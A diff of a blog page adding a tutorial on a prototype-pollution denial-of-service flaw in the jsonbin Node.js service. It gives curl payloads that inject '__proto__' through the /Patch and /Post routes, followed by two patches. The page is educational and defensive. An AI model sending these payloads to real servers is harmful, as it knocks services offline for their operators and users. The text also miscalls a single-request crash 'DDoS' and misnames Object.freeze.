@@ -218,7 +218,7 @@
       <span class="post-meta-item-text">Posted on</span>
       
 
-      <time title="Created: 2022-11-06 18:23:47 / Modified: 18:25:36" itemprop="dateCreated datePublished" datetime="2022-11-06T18:23:47-05:00">2022-11-06</time>
+      <time title="Created: 2022-11-06 18:23:47 / Modified: 18:29:59" itemprop="dateCreated datePublished" datetime="2022-11-06T18:23:47-05:00">2022-11-06</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -240,7 +240,47 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          
+          <p>This article provides an DDoS attack example that exploit the prototype pollution vulnerability.</p>
+<p>Two versions of patch <a target="_blank" rel="noopener" href="https://github.com/kccarlos/prototypepollutionpatching">code</a> is also provided. </p>
+<h2 id="Install-and-Usage"><a href="#Install-and-Usage" class="headerlink" title="Install and Usage"></a>Install and Usage</h2><h3 id="Run-the-vulnerable-code"><a href="#Run-the-vulnerable-code" class="headerlink" title="Run the vulnerable code"></a>Run the vulnerable code</h3><ul>
+<li><p>Dependencies: MongoDB, NodeJS, NPM</p>
+</li>
+<li><p>Before installation, register your app with GitHub to obtain an authorization token using this <a target="_blank" rel="noopener" href="https://docs.github.com/en/developers/apps/building-oauth-apps/creating-an-oauth-app">guide</a>.</p>
+</li>
+<li><p>Project code with installation instructions: <a target="_blank" rel="noopener" href="https://github.com/remy/jsonbin">https://github.com/remy/jsonbin</a></p>
+</li>
+<li><p>Follow the instruction in <a target="_blank" rel="noopener" href="https://jsonbin.org/">https://jsonbin.org</a> to use the service.</p>
+</li>
+</ul>
+<h3 id="Run-the-patched-code"><a href="#Run-the-patched-code" class="headerlink" title="Run the patched code"></a>Run the patched code</h3><ol>
+<li>Make sure that dependencies are installed (MongoDB, NodeJS, NPM). Also your app is registered with GitHub using this <a target="_blank" rel="noopener" href="https://docs.github.com/en/developers/apps/building-oauth-apps/creating-an-oauth-app">guide</a>.</li>
+<li>Download the code: <code>git clone https://github.com/kccarlos/prototypepollutionpatching.git</code></li>
+<li>Navigate to the project folder <code>cd prototypepollutionpatching/patchv1</code> or <code>cd prototypepollutionpatching/patchv2</code> (Two versions provided)</li>
+<li>run <code>npm install</code></li>
+<li>Set the configurations in <code>.dev.env</code> before running. An example is provided in <code>example.env</code></li>
+</ol>
+<h2 id="Exploit-the-Vulnerability"><a href="#Exploit-the-Vulnerability" class="headerlink" title="Exploit the Vulnerability"></a>Exploit the Vulnerability</h2><p><em><strong>!!! Be ethical: do not exploit the real website. Please install and run the source code and try the following exploit on your own machine.</strong></em></p>
+<p><strong>Vulnerability 1</strong>: exploiting the <code>/Patch</code> route</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://[DOMAIN:PORT]/[GITHUB_USERNAME]/foo \</span><br><span class="line">     -H <span class="string">&#x27;authorization: token xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#x27;</span> \</span><br><span class="line">     -d <span class="string">&#x27;&#123;  &#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">curl -X PATCH http://[DOMAIN:PORT]/[GITHUB_USERNAME]/foo \</span><br><span class="line">   -H <span class="string">&#x27;authorization: token xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#x27;</span> \</span><br><span class="line">   -d <span class="string">&#x27;&#123; &quot;__proto__&quot; : &#123; &quot;toString&quot; : &quot;attack&quot;&#125; &#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Vulnerability 2</strong>: exploiting the <code>/Post</code> route</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">curl -X POST http://[DOMAIN:PORT]/[GITHUB_USERNAME]/__proto__/toString \</span><br><span class="line">    -H <span class="string">&#x27;authorization: token xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#x27;</span> \</span><br><span class="line">    -d <span class="string">&#x27;&quot;attack&quot;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>After this attack, the server cannot response to requests. Therefore an DDos attack is completed.</p>
+<h2 id="Patch-Version-1"><a href="#Patch-Version-1" class="headerlink" title="Patch Version 1"></a>Patch Version 1</h2><p>The vulnerable code is <code>undefsafe()</code> and <code>jsonmergepatch()</code> in <code>lib/routes/api.js</code>.</p>
+<p>To fix this issue, we may add a checking command before these functions are called in <code>router.patch()</code>:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> req.<span class="property">body</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="title function_">hasOwnProperty</span>(<span class="string">&#x27;__proto__&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">json</span>(<span class="literal">null</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>In <code>router.post()</code>, there is a easier way to fix the vulnerability: checking the URL of the request.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (req.<span class="property">path</span>.<span class="title function_">includes</span>(<span class="string">&#x27;__proto__&#x27;</span>) ) &#123;</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">json</span>(<span class="string">&#x27;Invalid input&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Code is available in <code>./patchv1</code>.</p>
+<h2 id="Patch-Version-2"><a href="#Patch-Version-2" class="headerlink" title="Patch Version 2"></a>Patch Version 2</h2><p>We may patch the  vulnerability using <code>Object.prototype.freeze()</code>. First, we freeze the base object’s prototype property before executing <code>undefsafe()</code> and <code>jsonmergepatch()</code> in both <code>router.patch()</code> and <code>router.post()</code> functions:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">freeze</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br></pre></td></tr></table></figure>
+
+<p>Now the server will not fail and cause DDoS due to the vulnerability in <code>/Patch</code> and <code>/Post</code>.</p>
+<p>Full code is available in <code>./patchv2</code>.</p>
+
       
     </div>
 
